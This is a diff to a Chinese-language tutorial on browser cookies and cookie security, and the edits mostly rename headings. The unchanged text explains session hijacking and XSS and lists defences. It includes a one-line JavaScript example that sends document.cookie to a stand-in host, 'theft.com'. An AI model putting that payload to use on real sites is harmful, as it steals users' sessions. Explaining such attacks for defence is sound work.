@@ -42,12 +42,12 @@ document.cookie='cookieName=cookieValue; expires=Tue, 06 Apr 2021 11:46:35 GMT; 
 `3. 删除时，domain和path需要该cookie一致`<br>
 `4. httponly只能通过服务端Set-Cookie设置`<br>
 ## Cookie安全
-#### session hijacking（会话劫持）
+### SessionHijacking（会话劫持）
 在客户端和服务端之间进行cookie的传输时，网络上的流量可以被发送方以外的网络上的计算机拦截和读取，特别是在未加密开放式的wifi上，通过拦截到的cookie来冒充用户发起恶意行为<br>
 
 1.可以使用https加密传输，同时设置secure只能通过https进行传输<br>
 2.随机方式生成会话，或者基于用户信息+时间+ip地址生成会话
-#### XSS（跨站脚本攻击）
+### XSS（跨站脚本攻击）
 在客户端执行了没有经过过滤的恶意代码将cookie发送到第三方服务器上，即使cookie添加了secure，如果第三方服务器启用了https，一样会被发送,如下代码
 ```js
  (new image()).src='https://theft.com/transparent.jpg?cookie='+document.cookie;
@@ -61,8 +61,9 @@ document.cookie='cookieName=cookieValue; expires=Tue, 06 Apr 2021 11:46:35 GMT; 
 - 存储时进行转义
 - 不要引用来自不受信任域的js文件
 
-**2.控制执行**
+**2.执行控制**
 
 - 在输出时先对内容（来自url参数或者ajax）进行转义如（ & < > " ' / javascript:）
 - 注意使用eval()、setTimeout()、setInterval()、innerHTML、document.write()等可以执行字符串的代码
 - 由服务端通过Set-Cookie设置httponly，使document.cookie无法获取
+### CSRF（跨域请求伪造）
